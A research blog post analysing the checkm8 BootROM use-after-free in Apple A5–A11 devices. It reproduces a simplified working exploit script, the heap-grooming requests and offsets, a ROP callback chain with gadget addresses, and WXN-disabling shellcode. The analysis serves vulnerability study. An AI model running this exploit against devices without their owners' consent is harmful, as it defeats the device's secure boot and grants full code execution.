---
title: "Technical Analysis of the checkm8 Exploit"
date: 2019-10-05
description: "Deep dive into the checkm8 bootrom exploit for Apple A5-A11 SoCs: USB DFU stack use-after-free, heap grooming, and AArch64 shellcode execution"
tags: ["checkm8", "iPhone", "AArch64", "iOS", "bootrom", "UAF", "jailbreak", "hardware-security"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

![checkm8 banner](/images/blog/checkm8-technical-analysis/Untitled.png)

The checkm8 vulnerability exploits an unpatchable flaw in the BootROM of most iDevices including the iPhone X. This post provides a technical analysis of the exploit and its root cause.

## Introduction

Before diving into the exploit itself, it helps to understand the iDevice boot process and the role of the BootROM (also called SecureROM).

The boot chain looks like this:

![Boot chain diagram](/images/blog/checkm8-technical-analysis/Untitled-1.png)

When a device powers on, BootROM runs first. Its main responsibilities are:

- Platform initialization (setting up required platform registers, CPU initialization, etc.)
- Verifying and transferring control to the next boot stage
  - BootROM supports IMG3/IMG4 image parsing
  - BootROM has access to the GID key for image decryption
  - For image verification, BootROM has the embedded Apple public key and necessary cryptographic primitives
- Restoring the device via Device Firmware Update (DFU) when further booting is not possible

BootROM is a very small piece of code — essentially a lightweight version of iBoot — and shares most of its library code with iBoot. Unlike iBoot, BootROM cannot be updated. It is stored in read-only memory at device manufacturing time and serves as the hardware trust root of the Secure Boot chain.

A BootROM vulnerability allows an attacker to control the boot process and execute unsigned code on the device.

![Secure Boot chain](/images/blog/checkm8-technical-analysis/Untitled-2.png)

## The History of checkm8

The checkm8 exploit was added to ipwndfu by its author axi0mX on September 27, 2019, along with a description and additional information about the exploit.

The UAF vulnerability in the USB code was discovered while patching the iBoot beta for iOS 12. Since BootROM and iBoot share most of their code including USB, the vulnerability exists in BootROM as well.

As shown in the exploit code, this vulnerability is triggered in DFU mode — a mode that allows transferring signed images to the device via USB for later booting. DFU is useful for restoring a device after a failed update, for example.

On the same day, user littlelailo announced that they had discovered this vulnerability in March and had published a description at [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4). While the description matches checkm8, not all exploit details were immediately clear. This post therefore explains all details of the exploit through payload execution in BootROM.

The analysis is based on the resources mentioned above, the iBoot/SecureROM source code leaked in February 2018, and data gathered through experiments on a test device (iPhone 7, CPID: 8010). SecureROM and SecureRAM dumps obtained using checkm8 itself aided the analysis.

## Necessary Info About USB

Since the vulnerability lives in USB code, we need to understand how this interface works. For our purposes, USB in a nutshell is sufficient — only the most relevant points are covered here.

There are various types of USB data transfers. In DFU, only **control transfer** mode is used.

In this mode, each transaction has three stages:

- **Setup Stage** — A Setup packet is sent with the following fields:
  - `bmRequestType` — defines direction, type, and recipient of the request
  - `bRequest` — defines the request itself
  - `wValue`, `wIndex` — interpreted depending on the request
  - `wLength` — specifies the length of data transferred in the Data Stage
- **Data Stage** — An optional data transfer stage. Data can be sent host-to-device (OUT) or device-to-host (IN) based on the Setup packet. Data is sent in small chunks (0x40 bytes for Apple DFU).
  - When the host wants to send more data, it sends an OUT token followed by the data itself.
  - When the host is ready to receive data, it sends an IN token to the device.
- **Status Stage** — The final stage, where the overall transaction status is reported.
  - For OUT requests, the host sends an IN token and the device must respond with a zero-length packet.
  - For IN requests, the host sends an OUT token and a zero-length packet.

The following schema shows OUT and IN requests (ACK, NACK and other handshake packets omitted for clarity):

![USB transaction schema](/images/blog/checkm8-technical-analysis/Untitled-3.png)

## Analysis of apollo.txt

This document describes the DFU mode algorithm. Essentially, every bootrom littlelailo has examined contains the following bug:

1. When USB starts fetching an image through DFU, DFU registers an interface that handles all commands and allocates buffers for input and output.
2. When data is sent to DFU, the Setup packet is handled by the main code and the interface code is called.
3. The interface code checks that `wLength` is shorter than the I/O buffer length, and in that case updates the pointer passed as an argument with the address of the I/O buffer.
4. It then returns the length it wants to receive as data.
5. The USB main code updates a global variable with the length and prepares to receive data packets.
6. When data packets arrive, they are written to the I/O buffer through the pointer passed as argument, and another global variable tracks how many bytes have already been received.
7. When all expected data is received, DFU-specific code is called again and copies the I/O buffer contents to the memory area where the image will later be booted from.
8. USB code then resets all variables and processes the next packet.
9. When DFU exits, the output buffer is freed; if image parsing fails, BootROM re-enters DFU.

Comparing these steps against the iBoot source code and the SecureROM reversed from an iPhone 7 in IDA:

DFU initialization allocates the I/O buffer and registers a USB interface for handling DFU requests:

```c
__int64 usb_dfu_init(){
    if(usb_dfu_inited & 1)
        return 0;
    io_buffer = memalign(0x800, 0x40); // IO-buffer allocation
    bzero(io_buffer, 0x800);

    unk_180088AD4[6] = [0,50,0,0,2,0];
    unk_180088AC0 = 0;
    byte_180088AC2[0] = 2;
    unk_180088AC8 = -1;

    // Register USB interface for handling DFU requests
    sub_10000AED4((__int64)&unk_180088AF0, 1, 0);
    usb_dfu_interface_instance.field_0 = 1;
    usb_dfu_interface_instance.field_8 = (__int64)&dword_100018794;
    usb_dfu_interface_instance.field_10 = 1;
    usb_dfu_interface_instance.field_18 = (__int64)byte_10001879D;
    usb_dfu_interface_instance.field_70 = (__int64)byte_1000E2DC;

    usb_dfu_interface_instance.request_handler = (__int64)handle_interface_request;
    usb_dfu_interface_instance.data_received_handler = (__int64)data_received;
    usb_core_register_interface(&usb_dfu_interface_instance);
    usb_dfu_inited = 1;
    return 0;
}
```

When a SETUP packet for a DFU request arrives, the appropriate interface handler is called. For OUT requests (e.g., when an image is being transferred), the handler must return the I/O buffer address and the expected data length:

```c
// get interface control request handler
request_handler = ep.registered_interfaces[(unsigned __int16)setup_request.wIndex]->request_handler;
if(!request_handler)
    goto LABEL_50;
// call to interface control request handler
// set global buffer pointer
request_handler(&g_setup_request, &ep0_data_phase_buffer);
if( !(g_setup_request.bmRequestType & 0x80000000)){
    if(request_handler_ret >= 1){
        ep0_data_phase_length = request_handler_ret; // set global length
        ep0_data_phase_if_num = intf_num;
        goto LABEL_101;
    }
    if(!request_handler_ret){
        sub_10000DB0C();
        goto LABEL_101;
    }
LABEL_50:
    sub_10000CF3C();
    *_data_phase = 0;
    return;
LABEL_101:
    if(g_setup_request.bmRequestType & 0x80){
        if((g_setup_request.bmRequestType & 0x80) != 0x80)
            return
        need_data_phase = 1; // activate data phase
    }else{
        need_data_phase = *(unsigned __int64 *)&g_setup_request >> 48 != 0;
    }
    *_data_phase = need_data_phase;
}
```

The DFU interface handler below checks the request; if valid, it returns the I/O buffer address (via output parameter) and the expected data length:

```c
excepted_length = (unsigned __int16)setup_request->wLength;
    if((DWORD)expected_length){
        if((unsigned int)excepted_length >= 0x801){
            dword_180088AD4 = 12815; // 0x320F
            word_180088AD8 = 2;
            byte_180088AC2[0] = 2;
            return -1;
        }
        *out_buffer = io_buffer; // return buffer pointer via argument
    }else{
        dword_180088AD4 = 12800; // 0x3200
        word_180088AD8 = 6;
        byte_180088AC2[0] = 6;
    }
    dfu_excepted_length = excepted_length;
    return excepted_length;
}
```

During the Data Stage, each data chunk is written to the I/O buffer, then the buffer pointer and received counter are updated. When all expected data is received, the interface data-received handler is called and the global state is cleared:

```c
*data_phase = 0;
    if( !(is_setup & 1)){
        if(!data_rcvd)
            return;
        if(ep0_data_phase_rcvd + data_rcvd <= ep0_data_phase_length){
            if(ep0_data_phase_length - ep0_data_phase_rcvd >= data_rcvd)
                to_copy = data_rcvd;
            else
                to_copy = ep0_data_phase_length - ep0_data_phase_rcvd;
            memcpy(ep0_data_phase_buffer, ep0_rx_buffer, to_copy); // copy received data to IO-buffer
            ep0_data_phase_buffer += (unsigned int)to_copy; // update global buffer pointer
            ep0_data_phase_rcvd += to_copy; // update received counter
            *data_phase = 1;
            // Stop transfer if expected bytes received or fewer than 0x40 bytes received
            if(data_rcvd == 0x40)
                end_of_transfer = ep0_data_phase_rcvd == ep0_data_phase_length;
            else
                end_of_transfer = 1;
            if(!end_of_transfer)
                return;
            if(!(ep0_data_phase_if_num & 0x80000000) && ep0_data_phase_if_num < registered_interfaces_count){
                // get interface data received handler
                data_received_handler = ep.registered_interfaces[ep0_data_phase_if_num]->data_received_handler;
                if(data_received_handler){
                    data_received_handler(ep0_data_phase_rcvd);
                    usb_core_send_zlp();
                }
            }
        }else{
            sub_10000CF3C();
        }
        // global state clearing
        ep0_data_phase_rcvd = 0;
        ep0_data_phase_length = 0;
        ep0_data_phase_buffer = 0;
        ep0_data_phase_if_num = -2;
        *data_phase = 0;
        return;
    }
}
```

In the DFU data handler, received data is moved to the memory area where the image will be loaded (referred to as `INSECURE_MEMORY` in iBoot source):

```c
*(QWORD *)&received = sub_10000AEE8(&unk_180088AF0);
    goto data_received;
}
*(QWORD *)&received = memcpy(*image_buffer[total_received], io_buffer, received); // concat IO-buffer image
dfu_excepted_length = 0;
dword_180088AD4 = 12800; // 0x3200
total_received += received;
```

When the device exits DFU mode, the previously allocated I/O buffer is freed.

If an image is successfully obtained in DFU mode, it is verified and booted. If there is an error or the image cannot be booted, DFU re-initializes and the whole process repeats from the beginning.

**The described algorithm contains a Use-After-Free vulnerability.** If a SETUP packet is sent for an image upload and the Data Stage is skipped (completing the transaction without data), then during the next DFU cycle the global state remains initialized and it is possible to write to the address of the I/O buffer allocated in the previous DFU iteration. This is the UAF.

Now that we know how the UAF works, the question is: what can we overwrite, and how? Before DFU re-initializes, all resources from the previous iteration are freed, and memory allocations in the new iteration must be exactly the same (heap feng-shui).

As a result, there is another memory leak that allows us to exploit the UAF.

## Analysis of checkm8

Now let's look at checkm8 itself. For illustration purposes, a simplified version of the exploit targeting iPhone 7 is used below. All platform-specific code has been removed and USB request ordering/types have been modified without affecting functionality. Payload construction has also been removed (it can be found in the original `checkm8.py`).

```python
#!/usr/bin/env python

from checkm8 import *

def main():
    print '*** checkm8 exploit by axi0mX ***'

    device = dfu.acquire_device(1800)
    start = time.time()
    print 'Found:', device.serial_number
    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    payload, - = exploit_config(device.serial_number)
    t8010_nop_gadget = 0x10000CC6C
    callback_chain = 0x1800B0800
    t8010_overwrite = '\0' * 0x5c0
    t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)

    # heap massage
    stall(device)
    leak(device)
    for i in range(6):
        no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # set global state and restart usb
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap occupation / spray
    device = dfu.acquire_device()
    device.serial_number
    stall(device)
    leak(device)
    leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)

    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    if 'PWND:[checkm8]' not in device.serial_number:
        print 'ERROR : Exploit failed. Device did not enter pwned DFU Mode'
        sys.exit(1)
    print 'Device is now in pwned DFU Mode'
    print '(%0.2f seconds)'%(time.time() - start)
    dfu.release_device(device)

if __name__ == '__main__':
    main()
```

The checkm8 operation has several stages:

1. Heap feng-shui
2. Allocate and free the I/O buffer without clearing global state
3. Overwrite `usb_device_io_request` on the heap via UAF
4. Place the payload
5. Execute the callback chain
6. Execute shellcode

### 1. Heap Feng-shui

This is the most interesting stage and deserves the most detailed explanation.

```python
stall(device)
leak(device)
for i in range(6):
    no_leak(device)
dfu.usb_reset(device)
dfu.release_device(device)
```

This stage arranges the heap in a way that allows the heap UAF to be leveraged.

The helper functions are defined as:

```python
def stall(device):
    libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A'*0xC0, 0.00001)
def leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device):
    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
```

`libusb1_no_error_ctrl_transfer` is a wrapper around `device.ctrlTransfer` that ignores any exception raised during request execution.

`libusb1_async_ctrl_transfer` is a wrapper around libusb's `libusb_submit_transfer` for asynchronous request execution.

Parameters passed to these calls:

- Device number
- SETUP packet data:
  - `bmRequestType`
  - `bRequest`
  - `wValue`
  - `wIndex`
- Data Stage data or data length (`wLength`)
- Request timeout

The parameters `bmRequestType`, `bRequest`, `wValue`, and `wIndex` are shared across all three request types:

- `bmRequestType = 0x80`
  - `0b1XXXXXXX` — Data Stage direction: Device to Host
  - `0bX00XXXXX` — Standard request type
  - `0bXXX00000` — Device is the recipient
- `bRequest = 6` — GET_DESCRIPTOR
- `wValue = 0x304`
  - `wValueHigh = 0x3` — descriptor type: String (USB_DT_STRING)
  - `wValueLow = 0x4` — string descriptor index 4 (device serial number)
- `wIndex = 0x40A` — string language identifier (value is not relevant to the exploit)

The request object structure (0x30 bytes allocated):

![usb_device_io_request structure](/images/blog/checkm8-technical-analysis/Untitled-4.png)

The most interesting fields are `callback` and `next`:

- `callback` — pointer to a function called when the request completes
- `next` — pointer to the next object of the same type; used to build the request queue

The main function of `stall` is to execute a request asynchronously with a minimal timeout. With luck, the request is cancelled at the OS level and remains in the execution queue, which is why the transaction is not completed. The device continues to receive all scheduled SETUP packets and places them in the execution queue as needed.

Experiments with an Arduino USB controller later revealed that for a successful exploit, the host must send a SETUP packet and an IN token, then cancel the transaction via timeout.

This incomplete transaction looks like:

![Incomplete stall transaction](/images/blog/checkm8-technical-analysis/Untitled-5.png)

The request lengths differ by only one unit. Standard requests have the following terminal callback:

```c
usb_device_io_request * standard_device_request_cb(usb_device_io_request * request){
    unsigned int io_length; // w8

    io_length = result->io_length;
    if(io_length && !(io_length & 0x3F) && (unsigned __int16)g_setup_request.wLength > io_length)
        result = (usb_device_io_request *)usb_core_send_zlp();
    return result;
}
```

The value of `io_length` equals the minimum of `wLength` from the request's SETUP packet and the original length of the requested descriptor. Since the descriptor is quite long, `io_length` can be controlled within that length.

The value of `g_setup_request.wLength` equals `wLength` from the most recent SETUP packet — in this case, `0xC1`.

Therefore, when a `stall`- or `leak`-type request completes, the condition in the terminal callback function is met and `usb_core_send_zlp()` is called. This call creates a zero-length packet request and places it in the execution queue.

This is necessary to properly complete the transaction in the Status Stage.

The `usb_core_complete_endpoint_io` function completes requests: it first calls the callback, then frees the request memory. Requests are completed not only when the entire transaction finishes, but also when USB is reset.

When a reset signal is received, all requests in the execution queue are completed.

When iterating through the cleanup loop and freeing requests later, `usb_core_send_zlp()` can be called selectively to gain enough heap control for the UAF. The cleanup loop looks like:

```c
aborted_list = ep->io_head;
ep->io_head = 0;
ep->io_tail = 0;
exit_critical_section();
while(aborted_list){
    v16 = aborted_list->next;
    aborted_list->status = 1;
    usb_core_complete_endpoint_io(aborted_list);
    aborted_list = v16;
}
```

Once the queue is drained, cancelled requests are executed and completed by `usb_core_complete_endpoint_io`. Requests allocated by `usb_core_send_zlp` are placed at `ep->io_head`.

When the USB reset completes, all endpoint information — including the `io_head`/`io_tail` pointers — is cleared, and the zero-length request remains on the heap. This allows small chunks to be created on the heap.

The schema below shows how this is done:

![Heap manipulation schema](/images/blog/checkm8-technical-analysis/Untitled-6.png)

New memory regions are allocated from the smallest available free chunk on the SecureROM heap. By creating small free chunks using the method described above, we can control memory allocation during USB initialization, including the `io_buffer` and request allocations.

To understand this better, let's examine what allocations happen on the heap when DFU initializes. By analyzing the iBoot source code and reversing the SecureROM, the following sequence was determined:

1. String descriptor allocations:
   - 1.1 Nonce (size 234)
   - 1.2 Manufacturer (22)
   - 1.3 Product (62)
   - 1.4 Serial Number (198)
   - 1.5 Configuration string (62)

2. Allocations related to USB controller task creation:
   - 2.1 Task structure (0x3c0)
   - 2.2 Task stack (0x1000)

3. `io_buffer` (0x800)

4. Configuration descriptors:
   - 4.1 High-Speed (25)
   - 4.2 Full-Speed (25)

Then request structures are allocated. With small chunks already on the heap, some allocations from the first category shift, and all other allocations shift accordingly. This allows overflowing into a `usb_device_io_request` by referencing the previous buffer.

The result looks like this:

![Heap layout after grooming](/images/blog/checkm8-technical-analysis/Untitled-7.png)

To calculate the required offsets, all the allocations listed above were emulated using a slightly modified version of the iBoot heap source code:

```c
#include "heap.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

#ifndef NOLEAK
#define NOLEAK (8)
#endif

int main() {
    void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    printf("chunk = %p\n", chunk);
    heap_add_chunk(chunk, 0x100000, 1);
    malloc(0x3c0); // Align lower byte of address in SecureRAM

    void * descs[10];
    void * io_req[100];
    descs[0] = malloc(234); // Nonce
    descs[1] = malloc(22);  // Manufacturer
    descs[2] = malloc(62);  // Product
    descs[3] = malloc(198); // Serial Number
    descs[4] = malloc(62);  // Configuration string

    const int N = NOLEAK; // 8

    void * task = malloc(0x3c0);    // Task Structure
    void * task_stack = malloc(0x4000); // Task Stack

    void * io_buf_0 = memalign(0x800, 0x40); // io_buffer
    void * hs = malloc(25); // High-Speed config descriptor
    void * fs = malloc(25); // Full-Speed config descriptor

    void * zlps[2];

    for(int i = 0; i < N; i++) // alloc io_queue
    {
        io_req[i] = malloc(0x30);
    }

    for(int i = 0; i < N; i++) // free all but 2
    {
        if(i < 2)
        {
            zlps[i] = malloc(0x30);
        }
        free(io_req[i]);
    }

    // ... (second round of allocations)

    printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0);
    printf("hs_off  = %#lx\n", (int64_t)hs - (int64_t)io_buf_0);
    printf("fs_off  = %#lx\n", (int64_t)fs - (int64_t)io_buf_0);

    return 0;
}
```

Output:

```
chunk = 0x1004000
...
io_req_off = 0x5c0
hs_off  = 0x4c0
fs_off  = 0x540
```

As shown, another `usb_device_io_request` appears at offset `0x5c0` from the start of the previous buffer.

This corresponds directly to the exploit code:

```python
t8010_overwrite = '\0' * 0x5c0
t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)
```

The validity of these conclusions can be verified by analyzing the current state of the SecureRAM heap provided with checkm8. A small script parses the heap dump and enumerates chunks. Note that some metadata is corrupted during the `usb_device_io_request` overflow; those chunks are skipped.

```python
#!/usr/bin/env python3

import struct
from hexdump import hexdump

with open('HEAP', 'rb') as f:
    heap = f.read()

cur = 0x4000

def parse_header(cur):
    _, _, _, _, this_size, t = struct.unpack('<QQQQQQ', heap[cur:cur + 0x30])
    is_free = t & 1
    prev_free = (t >> 1) & 1
    prev_size = t >> 2
    this_size *= 0x40
    prev_size *= 0x40
    return this_size, is_free, prev_size, prev_free

while True:
    try:
        this_size, is_free, prev_size, prev_free = parse_header(cur)
    except Exception as ex:
        break
    print('chunk at', hex(cur + 0x40))
    if this_size == 0:
        if cur in (0x9180, 0x9200, 0x9280):  # skipping damaged chunks
            this_size = 0x80
        else:
            break
    print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free)
    hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)])
    cur += this_size
```

The lower bytes of addresses in the output match the emulation results.

It is also possible to overflow into the High-Speed/Full-Speed configuration descriptors immediately following the `io_buffer`. One of the configuration descriptor fields holds the total length; overflowing it allows reading beyond the descriptor. This can be experimented with by modifying the exploit.

### 2. Allocate and Free io_buffer Without Clearing Global State

```python
device = dfu.acquire_device()
device.serial_number
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
dfu.release_device(device)
```

This stage creates an incomplete OUT request for an image upload.

Simultaneously, the global state is initialized and the buffer address on the heap is written into `io_buffer`. DFU is then reset with a `DFU_CLR_STATUS` request, and a new DFU iteration begins.

### 3. Overwrite usb_device_io_request on the Heap via UAF

```python
device = dfu.acquire_device()
device.serial_number
stall(device)
leak(device)
leak(device)
libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
```

In this stage, a `usb_device_io_request` object is allocated on the heap and overflowed with `t8010_overwrite`.

The contents of this overwrite were defined in the first stage:

`t8010_nop_gadget` and `0x1800B0800` are the values that must overflow the `callback` and `next` fields of the `usb_device_io_request` structure.

The `t8010_nop_gadget` is shown below. Despite its name, in addition to returning, it also restores the previous LR register and skips the `free` call after the callback in `usb_core_complete_endpoint_io`. This is important because the overflow corrupts heap metadata, and a `free` attempt would break the exploit:

```
bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0]  // restore fp, lr
bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20
bootrom:000000010000CC74 RET
```

`next` points to `INSECURE_MEMORY + 0x800`. INSECURE_MEMORY will later store the exploit's payload, and the callback chain lives at payload offset `0x800`.

### 4. Placing the Payload

```python
for i in range(0, len(payload), 0x800):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50)
```

All subsequent packets are placed in the memory area allocated for the image. The payload layout:

```
0x1800B0000: t8010_shellcode              # initializing shellcode
...
0x1800B0180: t8010_handler               # new USB request handler
...
0x1800B0400: 0x1000006a5                 # fake translation table descriptor
                                         # SecureROM: 0x100000000 -> 0x100000000
                                         # matches value in original translation table
...
0x1800B0600: 0x60000180000625            # fake translation table descriptor
                                         # SecureRAM: 0x180000000 -> 0x180000000
                                         # matches value in original translation table
0x1800B0608: 0x1800006a5                 # fake translation table descriptor
                                         # new value: 0x182000000 -> 0x180000000
                                         # with code execution permissions
0x1800B0610: disable_wxn_arm64           # code to disable WXN
0x1800B0800: usb_rop_callbacks           # callback chain
```

### 5. Execution of the Callback Chain

```python
dfu.usb_reset(device)
dfu.release_device(device)
```

After the USB reset, a loop begins cancelling incomplete `usb_device_io_request` entries in the queue via the linked list. In the previous stage, the remaining queue was replaced to gain control over the callback chain. To build this chain, the following gadget is used:

```
bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request ptr; X8 = arg0, X10 = call addr
bootrom:000000010000CC50 LSL W2, W2, W9
bootrom:000000010000CC54 MOV X0, X8 ; arg0
bootrom:000000010000CC58 BLR X10   ; call
bootrom:000000010000CC5C CMP W0, #0
bootrom:000000010000CC60 CSEL W0, W0, W19, LT
bootrom:000000010000CC64 B   loc_10000CC6C
```

As shown, the call address and first argument are loaded from offset `0x70` of the request structure. This gadget makes it trivial to issue any `f(x)` style call.

The entire call chain can be emulated with Unicorn Engine (we used a modified version of the uEmu plugin):

![Callback chain emulation](/images/blog/checkm8-technical-analysis/Untitled-8.png)

The full chain for iPhone 7:

#### 5.1. dc_civac 0x1800B0600

```
000000010000046C: SYS #3, c7, c14, #1, X0
0000000100000470: RET
```

Cleans and invalidates the processor cache for a virtual address. This makes the processor address into a payload.

#### 5.2. dmb

```
0000000100000478: DMB SY
000000010000047C: RET
```

A memory barrier ensuring all memory operations before this instruction complete. High-performance processors can execute instructions out of order for optimization; this prevents that.

#### 5.3. enter_critical_section()

Interrupts are masked for atomic execution of the subsequent operations.

#### 5.4. write_ttbr0(0x1800B0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

TTBR0_EL1 is set to `0x1800B0000` — the INSECURE_MEMORY address where the exploit payload is stored. Translation descriptors are at specific payload offsets:

```
0x1800B0400: 0x1000006a5       0x100000000 -> 0x100000000 (rx)
...
0x1800B0600: 0x60000180000625  0x180000000 -> 0x180000000 (rw)
0x1800B0608: 0x1800006a5       0x182000000 -> 0x180000000 (rx)
```

#### 5.5. tlbi

```
0000000100000434: DSB SY
0000000100000438: SYS #0, c8, c7, #0
000000010000043C: DSB SY
0000000100000440: ISB
0000000100000444: RET
```

The translation table is invalidated so that addresses are translated according to the new translation table.

#### 5.6. 0x1820B0610 — disable_wxn_arm64

```
MOV  X1, #0x180000000
ADD  X2, X1, #0xA0000
ADD  X1, X1, #0x625
STR  X1, [X2,#0x600]
DMB  SY

MOV  X0, #0x100D
MSR  SCTLR_EL1, X0
DSB  SY
ISB

RET
```

WXN (Write permission implies Execute-Never) is disabled to allow code execution from RW memory. The translation table has been modified to enable execution of this WXN disable code.

#### 5.7. write_ttbr0(0x1800A0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

The original value of TTBR0_EL1 is restored. Since INSECURE_MEMORY data is overwritten, BootROM must work correctly during virtual address translation.

#### 5.8. tlbi

The translation table is reset again.

#### 5.9. exit_critical_section()

Interrupt handling returns to normal.

#### 5.10. 0x1800B0000

Control is transferred to the initializing shellcode.

The primary goal of the callback chain is therefore: **disable WXN and transfer control to shellcode in RW memory**.

### 6. Execution of Shellcode

The shellcode lives in `src/checkm8_arm64.S` and performs the following steps:

#### 6.1. Overwriting USB Configuration Descriptors

Global memory holds pointers to two configuration descriptors on the heap: `usb_core_hs_configuration_descriptor` and `usb_core_fs_configuration_descriptor`. These were corrupted in Stage 3. Since they are required for correct USB device interaction, the shellcode restores them.

#### 6.2. Changing the USB Serial Number

A new string descriptor is written with the substring `"PWND:[checkm8]"` appended to the serial number. This allows verifying whether the exploit succeeded.

#### 6.3. Overwriting the USB Request Handler Pointer

The original USB request handler pointer for the interface is overwritten with a pointer to a new handler, which will be placed in memory along with subsequent handlers.

#### 6.4. Copying USB Request Handler to the TRAMPOLINE Memory Area (0x1800AFC00)

When a USB request is received, the new handler checks the request's `wValue` against `0xffff`. If not equal, control is passed back to the original handler. If equal, various commands can be executed from the new handler — including `memcpy`, `memset`, and `exec`-family functions (effectively PC control).

**This completes the exploit analysis.**

## USB Low-Level Exploit Implementation

As a bonus example of low-level USB attacks, a proof-of-concept Arduino implementation of checkm8 using a USB Host Shield was published. The PoC works on iPhone 7 but can be ported to other devices. When an iPhone 7 in DFU mode is connected to the USB Host Shield, all steps described in this document are executed and the device enters `PWND:[checkm8]` mode. It can then be connected to a PC via USB and used with ipwndfu (for memory dumps, crypto key access, etc.).

This approach is more reliable than using asynchronous requests with minimal timeouts because it works directly with the USB controller.

![Arduino USB Host Shield PoC](https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg)

## Conclusion

This vulnerability continues to impact the jailbreak community. A jailbreak based on checkm8 — known as checkra1n — was already in development. Since the vulnerability cannot be patched, it will always work on affected chips (A5 through A11) regardless of iOS version. Many additional affected devices exist, including Apple Watch and Apple TV.

Beyond jailbreaking, this vulnerability also affects researchers studying Apple devices. With checkm8 it is already possible to boot an iOS device in verbose mode, dump the SecureROM, and decrypt firmware images using GID keys. The most interesting application, however, is entering debug mode on vulnerable devices using a special JTAG/SWD cable — something previously only possible with special prototype hardware or specialized service assistance. checkm8 makes Apple hardware research significantly easier and more accessible.

## References

1. Jonathan Levin, [*OS Internals: iBoot*](http://newosxbook.com/bonus/iBoot.pdf)
2. Apple, [iOS Security Guide](https://support.apple.com/guide/security/welcome/web)
3. littlelailo, [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4)
4. [usb.org](http://usb.org/)
5. [USB in a NutShell](https://www.beyondlogic.org/usbnutshell/usb1.shtml)
6. [ipwndfu](https://github.com/axi0mX/ipwndfu)
7. [ipwndfu fork by LinusHenze](https://github.com/LinusHenze/ipwndfu_public)
